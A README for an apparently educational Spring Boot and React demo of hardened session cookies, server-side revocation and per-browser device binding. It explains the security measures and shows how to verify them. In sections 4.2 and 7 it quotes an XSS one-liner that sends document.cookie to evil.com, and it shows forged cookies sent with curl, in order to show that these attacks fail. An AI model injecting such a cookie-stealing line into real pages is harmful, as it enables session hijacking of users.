# CookieShookie — Sign in / Register with a secure session cookie

A deliberately small Spring Boot + React project that demonstrates one idea:

> **Sign in once → the server starts a session and puts only its *id* in your
> browser → that id is looked up on every visit to fetch your name, email and
> sign-in count from the database.**

The cookie is `HttpOnly`, `Secure`, `SameSite=Lax`, served over HTTPS, and
contains nothing but 256 random bits.

On top of that sits a second, longer-lived cookie that does a different job:

> **Device binding** — a worker account is permanently tied to the first browser
> it signs in from. Not their PC, their *browser*. Admins are exempt, and an
> admin is the only one who can undo a binding.

See [DEPLOYMENT.md](DEPLOYMENT.md) for putting it on Vercel + Render + Neon.

> **Want to prove it rather than take it on trust?** Section 4 is the five-minute
> version — the test suite, the browser, the command line, the database.
> [TESTING.md](TESTING.md) is the exhaustive version.
>
> **New to sessions, hashing or TLS?** [EXPLAIN.md](EXPLAIN.md) Part 1 teaches the
> concepts from zero, with no code in it.

---

## 1. What changed, and why

This project used to put the user's details straight into the cookie:

```
Cookie: userInfo=tejas%7CTejas+Jaiswal%7Ctejas%40example.com%7C3
```

That is one string on the user's own disk, in plain text, editable with a text
editor, readable by any script on the page, and sent unencrypted over the
network. It now looks like this:

```
Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

...which means nothing to anybody who does not have our database.

| | Before | Now |
|---|---|---|
| Cookie contents | name, email, sign-in count | one random id |
| Where the data lives | the user's disk | a row in `USER_SESSION` |
| Can the user edit their own profile? | **yes** | no |
| Can JavaScript read the cookie? | **yes** | no — `HttpOnly` |
| Sent over plain HTTP? | **yes** | no — `Secure`, and the server only speaks HTTPS |
| Sent on other sites' requests? | **yes** | no — `SameSite=Lax` |
| Can we log someone out for real? | **no** | yes — delete the row |
| Does a stolen cookie expire? | only when the browser feels like it | on our deadline, enforced on read |

### The three storage places

| | `APP_USER` | `USER_SESSION` | The cookie |
|---|---|---|---|
| Lives on | the **server** | the **server** | the **user's browser** |
| Holds | username, password, name, email, **visit count** | session id (hashed), name, email, expiry | one random id |
| Shared by | everyone | one browser each | only that one browser |
| Cleared by | deleting the file | signing out, or expiry | signing out |

**Registering** writes to `APP_USER`. **Signing in** creates a `USER_SESSION` row
and sends its id as a cookie. **Every page load** looks the id up — and that is
what keeps you signed in.

### Staying signed in, and signing out

Refresh the page, open a new tab, or close the browser and come back next week:
you are still signed in, for up to 30 days. On every page load React calls
`/api/me`, the browser attaches the cookie automatically, and the server resolves
it to a row. No password is typed because none is needed — the cookie *is* the
credential.

**Sign out** deletes that row. That is the part that matters: the cookie is dead
everywhere the instant the row is gone, including any copy somebody else took.
Clearing the browser's cookie afterwards is only tidying up.

Under the old design, "log out" could only ask the browser to drop a cookie, so a
copied cookie kept working for the full 30 days. That gap is closed.

### The visit counter

`APP_USER.VISITS` goes up on every sign-in **and** every returning page load. It
is deliberately **not** shown anywhere — not on screen, not in the API response.
To see it:

```sql
SELECT USERNAME, VISITS FROM APP_USER;
```

That is the point worth making: it is a fact about the user that the browser is
never told, cannot read, and cannot influence — which is exactly what the
original cookie got wrong.

### Device binding — one worker, one browser

There are now **two** cookies, and the difference between them is the main thing
to understand:

| | `sid` | `did` |
|---|---|---|
| Answers | "may I skip the password?" | "may this person sign in *from here*?" |
| Contents | 256 random bits | a random UUID |
| Lifetime | 30 days | effectively permanent |
| Rotated on login? | **yes** — that is the fixation defence | **no** — it identifies the desk |
| Cleared on sign-out? | yes | **no** — the desk has not moved |
| Checked when? | every request | only at login, and only *after* the password |

A worker's first successful login mints a UUID, stores its SHA-256 hash on their
row, and sends the raw UUID as a persistent `HttpOnly` cookie. Every later login
is judged against those two facts — what the browser presents, and what the
account has on file:

| Browser sends | Worker on file | Owner of that token | Result |
|---|---|---|---|
| nothing | nothing | — | **register** this browser |
| nothing | a device | — | **refused** — "registered to another workstation" |
| a token | — | this worker | **allowed** |
| a token | — | another worker | **refused** — "this workstation belongs to someone else" |
| a token | nothing | nobody | **register** — this is the path back after a reset |
| a token | a device | nobody | **refused** — a stale token proves nothing |

**Admins are never asked the question at all.** Not "admins pass the check" —
nothing is read, nothing is written, and they are never issued a `did`. That has
to be true for the reset to be usable, because the admin fixing a locked-out
worker is standing at that worker's machine.

**Only an admin can undo a binding**, from the Workstations list on their account
screen. A worker cannot move themselves — if they could, the rule would enforce
nothing.

The token is a UUID *we* mint, deliberately **not** a MAC address, an IP, a
machine id or a browser fingerprint. Those all look sturdier and are all worse
here: a server only ever sees the router's MAC, IPs change on a DHCP renewal,
machine ids need an agent on every PC, and fingerprints collide between identical
corporate builds — which is precisely what an office of cloned machines is. See
the header comment in `DeviceBindingService.java` for the long version.

The honest tradeoff: it is a cookie. A worker who clears their cookies needs an
admin reset, and a worker who deliberately copies their cookie store to another
machine has moved their registration. This is a control against casual account
sharing in a trusted office, not a DRM scheme.

---

## 2. Project layout

```
cookie/
├─ backend/                       ← Java / Spring Boot
│  ├─ mvnw, mvnw.cmd                run Maven without installing it
│  ├─ make-keystore.cmd / .sh     ★ creates the HTTPS certificate (run once)
│  ├─ pom.xml                       the dependency list
│  └─ src/
│     ├─ main/
│     │  ├─ java/com/example/cookiedemo/
│     │  │  ├─ CookieDemoApplication.java   starts the app
│     │  │  ├─ AppUser.java               ◆ = one row in APP_USER (+ role, device)
│     │  │  ├─ Role.java                  ◆ WORKER or ADMIN
│     │  │  ├─ UserRepository.java        ◆ account queries
│     │  │  ├─ UserSession.java             = one row in USER_SESSION
│     │  │  ├─ SessionRepository.java       session queries
│     │  │  ├─ SessionService.java          mint / look up / revoke / purge
│     │  │  ├─ DeviceBindingService.java  ◆ the whole binding policy, one file
│     │  │  ├─ CookieFactory.java         ◆ the shared cookie hardening
│     │  │  ├─ AdminBootstrap.java        ◆ creates the first admin at startup
│     │  │  ├─ WebConfig.java             ◆ CORS — off unless you ask for it
│     │  │  ├─ AdminController.java       ◆ list workers / reset a device
│     │  │  └─ AuthController.java        ◆ the 4 endpoints + both cookies
│     │  └─ resources/
│     │     ├─ application.properties        HTTPS, cookies, database, admin
│     │     └─ keystore.p12                  the TLS certificate (gitignored)
│     ├─ Dockerfile                       ◆ how the API is deployed
│     └─ test/
│        ├─ java/.../SessionSecurityTest.java    17 tests: the session cookie
│        ├─ java/.../DeviceBindingTest.java   ◆ 25 tests: the decision table
│        └─ resources/application.properties    in-memory DB for tests
│
├─ frontend/                      ← React (Create React App + Ant Design)
│  ├─ .env                          HTTPS=true for the dev server
│  ├─ vercel.json                 ◆ the /api rewrite that keeps one origin
│  ├─ package.json
│  └─ src/
│     ├─ setupProxy.js              forwards /api to https://localhost:8443
│     ├─ index.js                   applies the theme to Ant Design
│     ├─ App.js                     decides: sign-in screen or account screen?
│     ├─ AuthPanel.js             ◆ sign-in panel, with the device refusals
│     ├─ Account.js               ◆ the screen after signing in
│     ├─ AdminPanel.js            ◆ the workstation list and reset button
│     ├─ api.js                   ◆ the fetch() calls to Java
│     └─ brutal.css               ◆ the neo-brutalist theme
│
├─ render.yaml                    ◆ the API's deployment blueprint
└─ DEPLOYMENT.md                  ◆ Vercel + Render + Neon, start to finish
```

◆ = new or changed by the device-binding work.

---

## 3. How to run it

You need **Java 17 or newer** and **Node.js**. You do **not** need to install
Maven — `mvnw` downloads it the first time you run it.

### Step 0 — create the TLS certificate (once)

The backend serves HTTPS, so it needs a certificate. The keystore is deliberately
**not** in git (a private key is a secret, even a throwaway one), so make your
own:

```bash
cd backend
make-keystore.cmd
```

> Mac/Linux: `chmod +x make-keystore.sh && ./make-keystore.sh`
>
> If `keytool is not recognized`, set `JAVA_HOME` to your JDK folder first, e.g.
> `set JAVA_HOME=C:\Program Files\Java\jdk-26.0.2`

That writes `backend/src/main/resources/keystore.p12`. You only ever do this once
(or once a year — the certificate is valid for 365 days).

### Terminal 1 — the backend

```bash
cd backend
.\mvnw spring-boot:run
```

> On Windows PowerShell the `.\` is required. On Mac/Linux use `./mvnw`.

Wait for `Started CookieDemoApplication`. It is now serving on
**https://localhost:8443** — note the **s** and the new port.

### Terminal 2 — the frontend

```bash
cd frontend
npm install
npm start
```

Your browser opens **https://localhost:3000**.

> **The certificate warning is expected.** Both servers use self-signed
> certificates, so the browser will say it cannot verify who `localhost` is —
> which is true, and is the certificate check doing its job. Click
> *Advanced → Proceed*. A real deployment uses a certificate from a CA
> (Let's Encrypt), or terminates TLS at a load balancer in front of the app.

> **Why two servers?** React's dev server (3000) handles the UI. Java (8443)
> handles the data. `frontend/src/setupProxy.js` forwards every `/api/...` call
> to Java, so the browser thinks it is all one website — and same-origin is
> exactly what lets a `SameSite` cookie work with no CORS configuration at all.
>
> This replaces the old one-line `"proxy"` field in `package.json`, which could
> not be used any more: it refuses to connect to a self-signed certificate.
> `setupProxy.js` sets `secure: false` to allow that, **for development only**.

### Try the actual demo

1. **Create account** — name, email, username, password.
2. **Sign in** → the account screen shows your name and email. Both came back as
   JSON from `/api/me`, read off a database row; neither was in the cookie.
3. **Press F5.** You stay on the account screen — no password, no flicker back to
   the login form. That's the session doing its job.
4. **Close the whole browser**, reopen `https://localhost:3000`. Still signed in.
   This keeps working for 30 days.
5. **Sign out** → the session row is deleted and the cookie is cleared. Refresh
   now and you stay out. Your account is still in the database, so you can sign
   straight back in.

> **Where's the sign-in counter?** In the database and nowhere else — see the end
> of section 1. `SELECT USERNAME, VISITS FROM APP_USER;` in the H2 console.

### Try the device binding

You need **two different browsers** (Chrome and Firefox, or one normal and one
private window). Two tabs will not do — they share a cookie jar, which is
precisely the thing being tested.

1. In **Browser A**, sign in as the account you just created. In DevTools →
   Application → Cookies there are now **two** cookies: `sid` and `did`.
2. In **Browser B**, sign in as that same worker. Correct password, refused
   anyway: *"already registered to a different workstation"*.
3. Back in **Browser A**, sign out and try a *second* worker account. Also
   refused: *"this workstation is already registered to another user"*.
4. Sign in as the admin — `admin` / `admin` by default, and the startup log warns
   you about that. It works, on any browser, including this one.
5. On the admin's account screen, open **Workstations**, and press **Reset**
   against the first worker. They can now register Browser B, and Browser A stops
   working for them.

That is the behaviour. **Section 4 below is how you prove the security**, and
[DEPLOYMENT.md](DEPLOYMENT.md) is how you put it on the internet.

---

## 4. How to demonstrate the security

Everything above could be claimed by any app. This section is how you show it is
true. Four checks, roughly five minutes, no setup beyond having the app running.

> The deep version — every attack, every attribute, troubleshooting — is
> [TESTING.md](TESTING.md). What follows is the short path that covers the four
> things anyone will actually ask about.

### 4.1 The automated suite — start here

```bash
cd backend
.\mvnw.cmd test
```

```
Tests run: 42, Failures: 0, Errors: 0, Skipped: 0
```

Forty-two integration tests, split across two files:
[`SessionSecurityTest.java`](backend/src/test/java/com/example/cookiedemo/SessionSecurityTest.java)
(17, on the session cookie) and
[`DeviceBindingTest.java`](backend/src/test/java/com/example/cookiedemo/DeviceBindingTest.java)
(25, one for every row of the decision table). A real Spring context starts and a
real (in-memory) database is written to; only the network is faked, so it runs in
seconds and needs no certificate or browser.

The five worth opening in front of someone:

| Test | What it proves |
|---|---|
| `cookieIsHardened` | `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, `Max-Age` are all really on the header |
| `handWrittenPayloadIsRejected` | The **old** attack — pasting `tejas\|Someone Else\|…\|999` — now returns `{"found":false}` |
| `logoutRevokesServerSide` | After logout, replaying the exact cookie an attacker copied gets nothing |
| `rejectsAnotherWorkerOnABoundWorkstation` | A second worker cannot sign in at someone else's desk |
| `refusalHasNoSideEffects` | A device refusal issues no session, no cookie, and does not even count a visit |

Tests use `jdbc:h2:mem:testdb`, so running them cannot touch your demo accounts —
or Neon.

### 4.2 In the browser — the part only a browser can show

`MockMvc` can prove we *wrote* `HttpOnly` onto the header. Only a real browser
can prove it *hides the cookie from JavaScript*. That is this bit.

Sign in at **https://localhost:3000**, then:

**a) `HttpOnly`, live.** Open `F12` → **Console** and type:

```js
document.cookie
```

```
''
```

Empty — while the cookie is being sent on every single request. Say: *"if a bug
ever let an attacker inject `fetch('evil.com?c='+document.cookie)` onto this
page, it would steal an empty string."*

**b) The attributes.** `F12` → **Application** → **Cookies** → `https://localhost:3000`

| Name | Value | Path | HttpOnly | Secure | SameSite |
|---|---|---|---|---|---|
| `sid` | `ULaB692K73XL…` | `/` | ✔ | ✔ | `Lax` |

Point at two things: the **Value** column is gibberish (nothing personal is
stored in this browser), and the ✔ ticks are *the browser confirming it will
enforce them* — not us claiming we asked.

**c) Try to tamper.** Double-click the value, change one character, refresh.
You are signed out. Say: *"there is nothing in there worth editing. In the old
version this field read `tejas|Tejas Jaiswal|tejas@example.com|3`, and I could
have made it say anything."*

### 4.3 On the command line — see the raw header

Fastest way to show someone who does not want to read Java.

> **The commands below are written for PowerShell.** Three things to know:
>
> 1. Write **`curl.exe`**, not `curl` — in PowerShell `curl` is an alias for
>    `Invoke-WebRequest`, which takes completely different arguments.
> 2. `-k` means "don't verify the certificate". Expected for our self-signed dev
>    cert; never carry that flag into anything real.
> 3. **The JSON quoting is shell-specific and the two forms are not
>    interchangeable.** PowerShell needs single quotes outside and backslashes
>    inside; bash needs the opposite. Getting it wrong gives a confusing
>    `400 Bad Request` that looks like a bug in the app:
>
> ```
> PowerShell:  -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
> bash/zsh:    -d '{"username":"demo","password":"pw123"}'
> ```

**HTTPS is enforced** — the server will not speak plain HTTP at all:

```bash
curl.exe -s http://localhost:8443/api/me
```

```
Bad Request
This combination of host and port requires TLS.
```

**The Set-Cookie header** (register `demo`/`pw123` first if needed — see TESTING.md §2b):

```bash
curl.exe -k -s -D - -o NUL -X POST https://localhost:8443/api/login -H "Content-Type: application/json" -d '{\"username\":\"demo\",\"password\":\"pw123\"}'
```

```
Set-Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos; Path=/; Max-Age=2592000; Expires=Fri, 04 Sep 2026 11:39:09 GMT; Secure; HttpOnly; SameSite=Lax
```

Every attribute, one line, nothing to take on trust.

**The attacks that now fail:**

```bash
# an invented session id
curl.exe -k -s -H "Cookie: sid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://localhost:8443/api/me

# the OLD hand-edited cookie — this used to work
curl.exe -k -s -H "Cookie: sid=demo|Someone Else|evil@example.com|999" https://localhost:8443/api/me
```

Both: `{"found":false}`

**Revocation is real.** Note your cookie value, click Sign out (or `POST
/api/logout`), then replay the value an attacker would have kept:

```bash
curl.exe -k -s -H "Cookie: sid=<the value from before>" https://localhost:8443/api/me
```

```json
{"found":false}
```

**This is the single biggest improvement.** Before, logging out was a polite
request to the browser — a copied cookie kept working for the remaining 30 days
and the server could do nothing about it. Now the truth is a row, and deleting it
kills every copy at once.

### 4.4 In the database — the cookie isn't even stored

Open **https://localhost:8443/h2-console** — JDBC URL
`jdbc:h2:file:./data/cookiedemo`, user `sa`, blank password:

```sql
SELECT * FROM USER_SESSION;
```

```
ID          3bb5a229766c16c4662014fedcc78f4a2bbaf54cc03b3186052b948871ca53fa
USERNAME    demo
FULL_NAME   Demo User
EMAIL       demo@example.com
VISITS      1
```

The `ID` is **not** the cookie in the browser — it is the SHA-256 of it. Confirm
it yourself in PowerShell:

```powershell
$token = "dAgS4kVhnTMq2nLNb2DXiyJP-eqMo2EYKlYIE78ydfY"
$sha = [System.Security.Cryptography.SHA256]::Create()
-join ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($token)) | ForEach-Object { $_.ToString("x2") })
```

Why bother? Because a session id is a live credential — whoever holds it *is* the
user, no password needed. Storing the hash means the table can **recognise** a
session id but never **produce** one. Same reasoning as hashing passwords, one
layer up. A leaked backup or a screenshot of this console hands over nothing.

### 4.5 The summary table — what each measure actually stops

| Attack | Before | Now | What stops it |
|---|---|---|---|
| Edit the cookie to become another user | Worked | Fails | Nothing in the cookie to edit |
| Set your own sign-in count to 9999 | Worked | Fails | It's a column, not a cookie field |
| XSS reads `document.cookie` and posts it away | Worked | Gets `''` | `HttpOnly` |
| Sniff the cookie on shared wifi | Worked | Nothing to sniff | HTTPS + `Secure` |
| `evil.com` silently POSTs to `/api/logout` | Worked | Cookie not attached | `SameSite=Lax` |
| Reuse a cookie copied before logout | Worked for 30 days | Dead immediately | Server-side revocation |
| Plant a session id, wait for the victim to log in | Worked | Planted id discarded | New id minted on every login |
| Read the session table and sign in as someone | Worked | Cannot | Only the hash is stored |
| Guess a session id | n/a | 2²⁵⁶ possibilities | `SecureRandom`, 32 bytes |

**What is still not protected** — say this before someone else does:
passwords are stored in plain text, there is no rate limiting on `/api/login`, no
CSRF token beyond `SameSite`, the password comparison is not constant-time, and
the certificate is self-signed. Details and fixes in section 8.

---

## 5. The endpoints

The first four live in `AuthController.java`, the last two in `AdminController.java`.

| Method | URL | What it does |
|---|---|---|
| `POST` | `/api/register` | Saves a new user into `APP_USER`, always as a `WORKER` |
| `POST` | `/api/login` | Checks `APP_USER`, then the **device gate**, then creates a `USER_SESSION` row and sends its id as a hardened cookie |
| `GET` | `/api/me` | Looks the session id up — **this is what keeps you signed in**, and it counts the visit |
| `POST` | `/api/logout` | **Deletes the session row**, then clears the session cookie (the device cookie stays) |
| `GET` | `/api/admin/workers` | Admin only. Every worker, and whether each is bound to a browser |
| `POST` | `/api/admin/workers/{username}/reset-device` | Admin only. Unbinds a worker and ends their sessions |

### The lines that ARE the project now

Minting the id (`SessionService.java`):

```java
byte[] bytes = new byte[32];        // 256 bits
RANDOM.nextBytes(bytes);            // SecureRandom, never java.util.Random
String token = ENCODER.encodeToString(bytes);   // -> the browser

sessions.save(new UserSession(hash(token), user, visits, now, now.plus(ttl)));
//                            ^^^^^^^^^^^ only the SHA-256 goes to the database
```

Sending it (`AuthController.java`):

```java
ResponseCookie.from("sid", token)
    .httpOnly(true)      // document.cookie cannot see it
    .secure(true)        // https only
    .sameSite("Lax")     // not attached to other sites' requests
    .path("/")           // no Domain -> this host only, no subdomains
    .maxAge(Duration.ofDays(30))
    .build();
```

And on the React side, the one thing that makes cookies travel:

```js
fetch("/api/me", { credentials: "include" })
```

### Why the database stores a hash and not the id itself

The session id is a live credential: whoever holds it *is* the user, no password
required. If the table stored it raw, a leaked backup or a debug log would hand
out working sessions. Storing `SHA-256(token)` means the table can *recognise* an
id but never *produce* one — the same reasoning as hashing passwords, one layer up.

Plain SHA-256 is correct here and BCrypt would not be: the token is already 256
bits of true randomness, so there is nothing to brute-force, and a deliberately
slow hash would be paid on every single request.

### Why a new id is minted on every sign-in

Session fixation. The attack: get a value into the victim's cookie jar *before*
they sign in, wait for them to log in, then use that same value yourself — it is
now attached to their account. Minting a fresh id at the moment privilege changes
makes anything planted beforehand worthless. The visit counter is carried across
the swap, so the user notices nothing.

---

## 6. Configuration

Everything security-relevant is in `backend/src/main/resources/application.properties`:

| Setting | Default | What it does |
|---|---|---|
| `server.port` | `8443` | HTTPS port |
| `server.ssl.enabled` | `true` | Turns TLS on |
| `server.ssl.key-store-password` | `${KEYSTORE_PASSWORD:changeit}` | Override with an env var in anything real |
| `server.ssl.enabled-protocols` | `TLSv1.3,TLSv1.2` | Refuses the old broken versions |
| `app.cookie.secure` | `true` | The `Secure` attribute, on **both** cookies |
| `app.cookie.same-site` | `Lax` | `Lax` / `Strict` / `None`, on both cookies |
| `app.session.cookie-name` | `sid` | See the note on `__Host-` below |
| `app.session.ttl-minutes` | `43200` (30 days) | Cookie `Max-Age` **and** the enforced `expires_at`. Set to `1` to watch a session expire |
| `app.device.cookie-name` | `did` | The device-binding cookie |
| `app.device.cookie-max-age-days` | `3650` | Re-sent on every login, so it never lapses in practice |
| `app.bootstrap.admin.username` | `admin` | Created at startup. **Change it.** Blank disables |
| `app.bootstrap.admin.password` | `admin` | **Change it.** Never overwrites an existing account's password |
| `app.cors.allowed-origins` | *(blank)* | Leave blank. See `WebConfig` for why same-origin is better |

Every one of these has an environment-variable override (`APP_COOKIE_SECURE`,
`SPRING_DATASOURCE_URL`, and so on), which is why there is no `prod` profile:
the same jar runs on your laptop and on Render, and the environment is the only
difference. See [DEPLOYMENT.md](DEPLOYMENT.md).

**One free hardening step:** rename the cookie to `__Host-sid`. Browsers give any
cookie starting with `__Host-` special treatment — they refuse to store it unless
it is `Secure`, `Path=/`, and has no `Domain`, and they forbid a subdomain from
overwriting it. We already satisfy all three conditions. It is off by default only
because the prefix makes the cookie silently vanish if you ever set
`cookie-secure=false` to debug over plain HTTP, which is confusing to run into.

---

## 7. Answers to questions your manager might ask

**"Why a cookie and not localStorage?"**
Two reasons now. A cookie is sent to the server automatically on every request,
so Java can read it without the frontend doing anything. More importantly,
`localStorage` is *always* readable by JavaScript — there is no `HttpOnly` for it.
Any XSS bug empties it. A session cookie can be hidden from script entirely.

**"What is `HttpOnly` actually protecting against?"**
Cross-site scripting. If an attacker gets `<script>` onto our page, the one-liner
`fetch('https://evil.com?c='+document.cookie)` used to steal the session. Now it
sends an empty string.

**"Why HTTPS if it's only running on my laptop?"**
Because `Secure` is meaningless without it, and because a demo that only works
over plain HTTP is a demo of the wrong thing. Also, some browsers refuse to store
a `Secure` cookie on an `http://` origin at all (Chrome and Firefox make a special
exception for `localhost`; Safari does not).

**"What's `SameSite=Lax`?"**
The browser will send this cookie on normal navigation to our site, but not on
requests that *another* website fires at us in the background. That is what stops
`evil.com` from silently POSTing to `/api/logout` with your cookie attached — a
CSRF attack. `Strict` is tighter but drops the cookie when you follow a link in
from elsewhere. `None` sends it everywhere and requires `Secure`.

**"What happens on a different computer?"**
No cookie there, so no session, so the count starts at 1 again. Cookies are
per-browser, not per-account — which is exactly what "this browser remembers you"
should mean.

**"Where does the sign-in count come from now?"**
A column. On sign-in we read the old session's count, add one, and store it on the
new row. Under the old design it came from the cookie, which meant the user could
set it to 9999 with a text editor.

**"What if someone steals the cookie anyway?"**
Then they have that session until it expires or somebody signs out — and
that button now genuinely works, which is the point. Reducing the *window* is why
sessions are revocable and why ids rotate on sign-in.

**"Where's the SQL for `findByUsername`?"**
Spring writes it. Naming a method `findByUsername` in a `JpaRepository` is enough —
Spring reads the name and generates `SELECT * FROM app_user WHERE username = ?`
at startup. Same for `deleteByExpiresAtBefore` in `SessionRepository`.

---

## 8. Known simplifications (say this before they ask)

This is a teaching demo, not production code. The cookie handling is now genuinely
production-shaped; these are what remain:

1. **Passwords are still stored as plain text.** This is now the weakest thing in
   the project by a distance. The fix is small: add
   `spring-boot-starter-security`, hash with `BCryptPasswordEncoder` on register,
   and use `matches()` on login.
2. **No rate limiting on `/api/login`.** Nothing stops thousands of password
   guesses a second.
3. **No CSRF token.** `SameSite=Lax` covers the realistic cases for this app, but
   defence in depth pairs it with a synchroniser token.
4. **The password comparison is not constant-time.** `String.equals`
   short-circuits on the first differing character.
5. **The certificate is self-signed**, so it proves the traffic is encrypted but
   proves nothing about who is at the other end.
6. **The H2 console is enabled.** Fine on a laptop; a wide-open door on a server.
   Set `H2_CONSOLE_ENABLED=false` when deploying (`render.yaml` already does).
7. **`ddl-auto=update` lets Hibernate alter the live schema at startup.** Fine
   for a demo; a real service uses Flyway, so schema changes are reviewed files.
8. **Device binding is a cookie, and behaves like one.** A worker who clears
   their cookies needs an admin reset, and one who deliberately copies their
   cookie store to another machine has moved their registration. It is a control
   against casual account sharing in a trusted office, not hardware attestation —
   worth saying out loud before someone assumes otherwise.

Each is a deliberate trade for readability, and each has an obvious next step —
which is a good thing to be able to say out loud.

---

## 9. Versions this was built and tested against

| | |
|---|---|
| Java | 26 (anything 17+ works) |
| Spring Boot | 3.5.16 |
| Node | 24 |
| React | 18 (Create React App) |
| Ant Design | 5 |

> Spring Boot 3.5.x is used because older 3.3.x releases ship a Hibernate/ByteBuddy
> combination that refuses to start on very new JDKs. If you ever downgrade Spring
> Boot, run on Java 21 instead.
